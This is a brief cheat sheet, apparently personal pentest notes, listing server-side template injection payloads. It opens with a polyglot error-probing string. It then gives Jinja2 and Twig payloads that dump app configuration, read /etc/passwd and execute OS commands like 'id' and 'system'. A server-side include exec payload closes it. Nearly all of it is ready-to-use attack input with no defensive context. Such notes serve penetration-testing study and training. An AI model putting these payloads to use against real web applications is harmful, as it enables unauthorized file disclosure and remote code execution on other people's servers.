test for errors with this : 
```
${{<%[%'"}}%\.
```

![[diagram.png]]
For JINJA :

web application's configuration
```jinja2
{{ config.items() }}
```

built-in functions 
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

LFI
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

RCE
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

For TWIG:

information about the template
```twig
{{ _self }}
```

LFI 
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

RCE
```twig
{{ ['id'] | filter('system') }}
```



**SSI**:


RCE
`<!--#exec cmd="whoami" -->`|